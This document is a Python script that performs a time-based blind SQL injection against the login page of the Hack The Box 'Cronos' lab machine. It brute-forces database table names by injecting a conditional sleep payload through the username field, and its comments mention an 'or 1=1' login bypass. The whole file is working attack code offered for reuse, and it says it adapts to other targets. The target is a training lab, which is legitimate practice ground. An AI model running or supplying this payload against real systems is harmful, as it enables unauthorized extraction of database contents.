#!/usr/bin/python3
# This script will work on any Hack The Box with http. 
# It must have a login url that you got access to using 'admin or 1=1-- -
# You may have to change additional parameters.
# This iteration is to enumerate the tables only

from pwn import *
import requests, time, string, pdb, signal

def def_handler(sig, frame):

    print("\n\n[!] Exiting the HTB Cronos SQL Injection Script...\n")
    sys.exit(1)

# CTRL+C
signal.signal(signal.SIGINT, def_handler)

#time.sleep(10)
# GLOBAL VARIABLES
login_url = "http://admin.cronos.htb/index.php"
characters = string.ascii_lowercase

def makeRequest():

    p1 = log.progress("SQLI")
    p1.status("Initiating brute force attack...")

    p2 = log.progress("Tables")

    time.sleep(2)

    table_name = ""

    for table in range(0, 5):
        for position in range(1, 10):
            for character in characters:

                post_data = {
                'username': "admin' and if(substr((select table_name from information_schema.tables where table_schema='admin' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (table, position, character), 
                'password': 'admin'
                }

                p1.status(post_data['username'])
                #time.sleep(1)

                time_start = time.time()
                r =requests.post(login_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    table_name += character
                    p2.status(table_name)
                    break
    table_name += ", "

if __name__ == '__main__':


    makeRequest()